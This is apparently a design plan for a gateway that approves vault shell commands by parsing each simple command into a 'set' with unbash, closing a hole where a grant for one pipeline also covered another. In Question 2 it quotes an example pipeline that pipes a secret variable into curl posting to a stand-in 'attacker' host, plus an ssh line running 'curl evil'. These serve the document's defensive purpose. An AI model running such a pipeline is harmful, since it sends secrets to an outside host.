# Questionaire

## Question 1 - Where does the shape of an operation get read?

Q: The gateway approves vault operations by a shape of the command line. Does it ask the Lexicon
daemon, which now parses bash, or parse for itself?
A: For itself, on `unbash` at the exact pin Lexicon's Bash provider carries, 4.0.10.

> Decided in `lexicon/plans/bash-provider.md`, Question 2, and confirmed by the owner: "would you
> choose to unbash in gateway?" The gateway runs in a container without Lexicon, and an approval
> decision is a pure function that may not depend on a daemon being up.

## Question 2 - What is the set a request names?

Q: A grant for `printf %s "$V" | sha256sum` covered `printf %s "$V" | curl -d @- https://attacker`,
since the shape stopped at the first metacharacter. What does a request name instead?
A: Every simple command in the line, as the program's basename with its first argument, or with
every argument once a flag leads. The set reaches commands nested in shell constructs and in
substitutions. A wrapper is peeled to the program it runs, its own options aside; an option the
table does not list stops the peel, so an unlisted one never takes its value for the program.

> The flag rule is the display shape's own: a flag's value can hide the target, so the whole
> argument list is the shape then. A parse failure, or a program count outside one to 64, makes the
> line its own single shape, covering nothing else. A wrapper mode that runs no program, `sudo -e`
> for one, is not peeled. What a program does with its arguments stays opaque. `ssh host uptime` and
> `ssh host 'curl evil'` are both `ssh host`, `docker exec ctr` covers whatever follows it, and
> `sh -c` is whole-line by the flag rule.

## Question 3 - What does a grant cover?

Q: With a set instead of one string, when does a window grant answer?
A: When the request's set is a subset of the grant's. A session grant still covers everything on
its entry. A window recorded before the set was kept covers nothing: its line is asked for once
more, within the thirty minutes it had left.

> Narrowing a grant never widens one: entry, session and set all still have to hold. Matching a
> setless window on its display shape would have kept the old hole open for it.

## Question 4 - What does the phone see? [Superseded]

Q: The request sheet shows the operation, the grants tab lists the shape, and a saved typed value
takes the shape as its title, which the helper matches. Does any of it change?

Superseded by `plans/claimed-backlog.md`, which renames both readings on the wire and teaches the
console to render the set.

# Plan

## Phase 1 - The set behind the grant ✅

- `unbash` at 4.0.10 in the gateway's dependencies.
- `gateway/vault/operationSet.ts`: `operationSet(operation)` over the unbash tree, exhaustive over
  its node kinds so a parser bump that adds one fails to typecheck, and `coveredBy`.
- `shapeFrom` holds the one shape rule, which the display shape applies to the words as written and
  the set applies to each peeled command, so the two readings cannot drift apart.
- A wrapper's options are read from its own help into three sets, and an option in none of them
  stops the peel, so an unlisted option never takes its own value for the program.
- The set rides the request row and a window grant, optional on the wire. `GrantScope` carries it,
  `covers` takes the subset, and a window without a set covers nothing.
- Tests: the set for nested commands, every place a substitution expands, wrappers and the
  fallbacks; a window that no longer covers the curl, through the real route; a window recorded
  without its set.
- `docs/vault.md` says what a window covers; the deferred note in `plans/vault.md` points here.
- Kotlin codegen for the two optional fields, and the kotlin gate.
